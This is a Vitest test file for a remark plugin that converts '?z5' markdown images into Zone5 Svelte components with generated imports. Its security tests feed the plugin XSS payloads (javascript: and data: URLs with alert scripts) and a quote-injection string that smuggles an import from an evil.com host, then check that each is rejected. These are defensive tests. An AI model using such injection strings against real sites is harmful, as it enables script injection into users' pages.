import type { Node, RootContent, RootContentMap } from 'mdast';
import { remark } from 'remark';
import type { SvelteComponent } from 'svast';
import { VFile } from 'vfile';
import { describe, expect, it } from 'vitest';

import { remarkZ5Images } from './remark.js';

const isRawNode = (node: RootContent): node is RootContentMap['raw'] => node.type === 'raw';

describe('remarkZ5Images', () => {
	const processor = remark().use(remarkZ5Images);

	it('should detect and group consecutive z5 images', async () => {
		const markdown = `# Test

![Image 1](image1.jpg?z5 "Title 1")

![Image 2](image2.jpg?z5 "Title 2")

![Image 3](image3.jpg?z5)

Some other content

![Single image](single.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const scriptNodes = tree.children
			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
			.filter((node) => node.value.startsWith('<script'));

		expect(scriptNodes).toHaveLength(1);
		expect(scriptNodes[0].value).toMatch(/import single from 'single.jpg\?z5';/);
		expect(scriptNodes[0].value).toMatch(/import image1 from 'image1.jpg\?z5';/);
		expect(scriptNodes[0].value).toMatch(/import image2 from 'image2.jpg\?z5';/);
		expect(scriptNodes[0].value).toMatch(/import image3 from 'image3.jpg\?z5';/);
	});

	it('should create Svelte component for consecutive images', async () => {
		const markdown = `![Image 1](image1.jpg?z5 "Title 1")
![Image 2](image2.jpg?z5 "Title 2")`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		// Should convert to HTML nodes instead of keeping as svelteComponent
		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(1);

		const htmlNode = htmlNodes[0] as import('mdast').Html;
		expect(htmlNode.value).toContain('<Zone5');
		expect(htmlNode.value).toContain('images=');
		expect(htmlNode.value).toContain('image1');
		expect(htmlNode.value).toContain('image2');
		expect(htmlNode.value).toContain('Image 1');
		expect(htmlNode.value).toContain('Image 2');
		expect(htmlNode.value).toContain('Title 1');
		expect(htmlNode.value).toContain('Title 2');
	});

	it('should convert non-consecutive z5 images to individual components', async () => {
		const markdown = `![Image 1](image1.jpg?z5)

Some text in between

![Image 2](image2.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		// Should create individual HTML components for each single image
		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');

		expect(htmlNodes).toHaveLength(2);

		// Check the first component
		const firstHtmlNode = htmlNodes[0] as import('mdast').Html;
		expect(firstHtmlNode.value).toContain('<Zone5');
		expect(firstHtmlNode.value).toContain('image1');
		expect(firstHtmlNode.value).toContain('Image 1');

		// Check the second component
		const secondHtmlNode = htmlNodes[1] as import('mdast').Html;
		expect(secondHtmlNode.value).toContain('<Zone5');
		expect(secondHtmlNode.value).toContain('image2');
		expect(secondHtmlNode.value).toContain('Image 2');

		const scriptNodes = tree.children
			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
			.filter((node) => node.value.startsWith('<script'));

		expect(scriptNodes).toHaveLength(1);
		expect(scriptNodes[0].value).toMatch(/import image1 from 'image1.jpg\?z5';/);
		expect(scriptNodes[0].value).toMatch(/import image2 from 'image2.jpg\?z5';/);
	});

	it('should convert single z5 image to component', async () => {
		const markdown = `![Single image](single.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		// Should create one HTML component for the single image
		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');

		expect(htmlNodes).toHaveLength(1);

		const htmlNode = htmlNodes[0] as import('mdast').Html;
		expect(htmlNode.value).toContain('<Zone5');
		expect(htmlNode.value).toContain('single');
		expect(htmlNode.value).toContain('Single image');

		const scriptNodes = tree.children
			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
			.filter((node) => node.value.startsWith('<script'));

		expect(scriptNodes).toHaveLength(1);
		expect(scriptNodes[0].value).toMatch(/import single from 'single.jpg\?z5';/);
	});

	it('should ignore non-z5 images', async () => {
		const markdown = `![Regular image](regular.jpg)

![Z5 image](z5.jpg?z5)

![Another regular](another.jpg)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		// Should create one HTML component for the z5 image
		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(1);

		const htmlNode = htmlNodes[0] as import('mdast').Html;
		expect(htmlNode.value).toContain('<Zone5');
		expect(htmlNode.value).toContain('z5');

		// Regular images should remain as paragraphs with images
		const paragraphs = tree.children.filter((node: Node) => node.type === 'paragraph');
		expect(paragraphs.length).toBeGreaterThanOrEqual(2); // The two regular images

		const scriptNodes = tree.children
			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
			.filter((node) => node.value.startsWith('<script'));

		expect(scriptNodes).toHaveLength(1);
		expect(scriptNodes[0].value).toMatch(/import z5 from 'z5.jpg\?z5';/);
	});

	it('should generate unique import keys for similar filenames', async () => {
		const markdown = `![Image](image.jpg?z5)
![Image](path/image.jpg?z5)
![Image](other/image.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const scriptNodes = tree.children
			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
			.filter((node) => node.value.startsWith('<script'));

		expect(scriptNodes).toHaveLength(1);
		expect(scriptNodes[0].value).toMatch(/import image_1 from 'path\/image.jpg\?z5';/);
		expect(scriptNodes[0].value).toMatch(/import image_2 from 'other\/image.jpg\?z5';/);
	});

	it('should handle images with no alt text or title', async () => {
		const markdown = `![](image1.jpg?z5)
![](image2.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');

		expect(htmlNodes).toHaveLength(1);
		const htmlNode = htmlNodes[0] as import('mdast').Html;
		expect(htmlNode.value).toContain('<Zone5');
		expect(htmlNode.value).toContain('image1');
		expect(htmlNode.value).toContain('image2');
	});

	it('should handle consecutive images with newlines between them', async () => {
		const markdown = `![Image 1](image1.jpg?z5)

![Image 2](image2.jpg?z5)

![Image 3](image3.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		// Should create one HTML component for all three consecutive images
		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');

		expect(htmlNodes).toHaveLength(1);
		const htmlNode = htmlNodes[0] as import('mdast').Html;
		expect(htmlNode.value).toContain('<Zone5');
		expect(htmlNode.value).toContain('image1');
		expect(htmlNode.value).toContain('image2');
		expect(htmlNode.value).toContain('image3');
		expect(htmlNode.value).toContain('Image 1');
		expect(htmlNode.value).toContain('Image 2');
		expect(htmlNode.value).toContain('Image 3');
	});
});

describe('remarkZ5Images HTML integration', () => {
	const processor = remark().use(remarkZ5Images);

	it('should convert Z5 images to HTML components in full pipeline', async () => {
		const markdown = `![Image 1](image1.jpg?z5 "Title 1")
![Image 2](image2.jpg?z5 "Title 2")`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		// Should create HTML nodes instead of svelteComponent nodes
		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(1);

		const htmlNode = htmlNodes[0] as import('mdast').Html;
		expect(htmlNode.value).toContain('<Zone5');
		expect(htmlNode.value).toContain('images=');
		expect(htmlNode.value).toContain('image1');
		expect(htmlNode.value).toContain('image2');

		const scriptNodes = tree.children
			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
			.filter((node) => node.value.startsWith('<script'));

		expect(scriptNodes).toHaveLength(1);
		expect(scriptNodes[0].value).toMatch(/import image1 from 'image1.jpg\?z5';/);
		expect(scriptNodes[0].value).toMatch(/import image2 from 'image2.jpg\?z5';/);
	});

	it('should handle single Z5 image in full pipeline', async () => {
		const markdown = `![Single image](single.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(1);

		const htmlNode = htmlNodes[0] as import('mdast').Html;
		expect(htmlNode.value).toContain('<Zone5');
		expect(htmlNode.value).toContain('single');
	});

	it('should convert svelteComponent node to HTML', async () => {
		// Create a tree with a svelteComponent node
		const svelteComponentNode: SvelteComponent = {
			type: 'svelteComponent',
			tagName: 'Zone5',
			properties: [
				{
					type: 'svelteProperty',
					name: 'images',
					shorthand: 'none',
					value: [
						{
							type: 'svelteDynamicContent',
							expression: {
								type: 'svelteExpression',
								value: '[{"key":"image1","alt":"Image 1","title":"Title 1"}]',
							},
						},
					],
					modifiers: [],
				},
			],
			selfClosing: true,
			children: [],
		};

		const tree: import('mdast').Root = {
			type: 'root',
			children: [svelteComponentNode as unknown as import('mdast').RootContent],
		};

		const file = new VFile();
		await processor.run(tree, file);

		// Should convert to HTML node
		expect(tree.children).toHaveLength(1);
		const htmlNode = tree.children[0] as import('mdast').Html;
		expect(htmlNode.type).toBe('html');
		expect(htmlNode.value).toContain('<Zone5');
		expect(htmlNode.value).toContain('images=');
		expect(htmlNode.value).toContain('image1');
	});

	it('should handle multiple svelteComponent nodes', async () => {
		const svelteComponentNode1: SvelteComponent = {
			type: 'svelteComponent',
			tagName: 'Zone5',
			properties: [
				{
					type: 'svelteProperty',
					name: 'images',
					shorthand: 'none',
					value: [
						{
							type: 'svelteDynamicContent',
							expression: {
								type: 'svelteExpression',
								value: '[{"key":"image1","alt":"Image 1"}]',
							},
						},
					],
					modifiers: [],
				},
			],
			selfClosing: true,
			children: [],
		};

		const svelteComponentNode2: SvelteComponent = {
			type: 'svelteComponent',
			tagName: 'Zone5',
			properties: [
				{
					type: 'svelteProperty',
					name: 'images',
					shorthand: 'none',
					value: [
						{
							type: 'svelteDynamicContent',
							expression: {
								type: 'svelteExpression',
								value: '[{"key":"image2","alt":"Image 2"}]',
							},
						},
					],
					modifiers: [],
				},
			],
			selfClosing: true,
			children: [],
		};

		const tree: import('mdast').Root = {
			type: 'root',
			children: [
				svelteComponentNode1 as unknown as import('mdast').RootContent,
				svelteComponentNode2 as unknown as import('mdast').RootContent,
			],
		};

		const file = new VFile();
		await processor.run(tree, file);

		// Should convert both to HTML nodes
		expect(tree.children).toHaveLength(2);

		const htmlNode1 = tree.children[0] as import('mdast').Html;
		expect(htmlNode1.type).toBe('html');
		expect(htmlNode1.value).toContain('image1');

		const htmlNode2 = tree.children[1] as import('mdast').Html;
		expect(htmlNode2.type).toBe('html');
		expect(htmlNode2.value).toContain('image2');
	});

	it('should leave non-svelteComponent nodes unchanged', async () => {
		const tree: import('mdast').Root = {
			type: 'root',
			children: [
				{
					type: 'heading',
					depth: 1,
					children: [{ type: 'text', value: 'Test' }],
				},
				{
					type: 'paragraph',
					children: [{ type: 'text', value: 'Some text' }],
				},
			],
		};

		const file = new VFile();
		await processor.run(tree, file);

		// Should remain unchanged
		expect(tree.children).toHaveLength(2);
		expect(tree.children[0].type).toBe('heading');
		expect(tree.children[1].type).toBe('paragraph');
	});
});

describe('remarkZ5Images security', () => {
	const processor = remark().use(remarkZ5Images);

	it('should reject URLs with protocol schemes', async () => {
		const markdown = `![Malicious](javascript:alert('xss')?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		// Should not create any Zone5 components or imports
		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(0);

		const scriptNodes = tree.children
			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
			.filter((node) => node.value.startsWith('<script'));
		expect(scriptNodes).toHaveLength(0);
	});

	it('should reject URLs with data: scheme', async () => {
		const markdown = `![Malicious](data:text/html,<script>alert('xss')</script>?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(0);
	});

	it('should reject URLs with quotes that could escape import statement', async () => {
		const markdown = `![Malicious](image'; import evil from 'http://evil.com/script.js?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(0);
	});

	it('should reject URLs with newlines', async () => {
		const markdown = `![Malicious](image.jpg
malicious-code?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(0);
	});

	it('should allow valid relative paths', async () => {
		const markdown = `![Valid](./images/photo.jpg?z5)
![Valid](../other/image.jpg?z5)
![Valid](image.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(1);

		const scriptNodes = tree.children
			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
			.filter((node) => node.value.startsWith('<script'));
		expect(scriptNodes).toHaveLength(1);
		expect(scriptNodes[0].value).toContain('./images/photo.jpg?z5');
		expect(scriptNodes[0].value).toContain('../other/image.jpg?z5');
		expect(scriptNodes[0].value).toContain('image.jpg?z5');
	});

	it('should reject http:// URLs', async () => {
		const markdown = `![Remote](http://example.com/image.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(0);
	});

	it('should reject https:// URLs', async () => {
		const markdown = `![Remote](https://example.com/image.jpg?z5)`;

		const file = new VFile(markdown);
		const tree = processor.parse(markdown);
		await processor.run(tree, file);

		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
		expect(htmlNodes).toHaveLength(0);
	});
});
